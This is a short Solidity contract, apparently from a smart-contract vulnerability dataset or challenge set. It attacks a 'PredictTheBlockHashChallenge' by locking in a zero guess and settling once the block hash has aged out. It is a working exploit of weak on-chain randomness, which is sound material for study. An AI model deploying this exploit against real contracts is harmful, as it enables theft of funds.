pragma solidity ^0.4.24;

import "../dataset/bad_randomness/old_blockhash.sol";

contract PredictTheBlockHashChallengeAttacker {

    PredictTheBlockHashChallenge target;

    function PredictTheBlockHashChallengeAttacker(address _target) public {
        target = PredictTheBlockHashChallenge(_target);
    }

    function attack() public payable {
        target.lockInGuess.value(1 ether)(0);
    }

    function retrieve() public {
        target.settle();
    }

    function() public payable {
    }

}